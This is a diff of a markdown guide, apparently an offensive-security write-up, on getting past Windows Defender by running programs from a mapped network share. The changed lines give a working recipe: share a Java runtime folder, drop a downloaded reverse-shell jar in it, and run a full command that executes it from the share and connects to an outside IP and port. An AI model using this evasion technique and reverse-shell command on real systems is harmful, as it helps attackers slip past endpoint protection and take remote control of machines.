@@ -43,9 +43,9 @@ According to the Windows Documentation, Defender wont scan User-Level Mapped Sha
 ## <a name="Java"></a>Example with Java
 
 1. Download and Install JRE 
-2. Share /bin folder - C:\Program Files\Java\jre-1.8\bin
+2. Share /bin folder - C:\Program Files\Java\jre-1.8\bin - I renamed my bin folder JRE when sharing in Advanced Sharing
 3. Download Reverse-Shell.jar and place in /bin folder - Stolen from https://github.com/ivan-sincek/java-reverse-tcp/blob/main/jar/Reverse_Shell.jar
-4. Execute java and jar file whilst bypassing Defender
+4. Execute java and jar file whilst bypassing Defender `\\192.168.59.130\JRE\bin\java -jar \\192.168.59.130\JRE\bin\Reverse_Shell.jar 10.201.20.61 8445`
 
 ![image](https://user-images.githubusercontent.com/130473605/235175752-b3b26e3d-5f12-4052-a124-a498cc28a8c8.png)
 
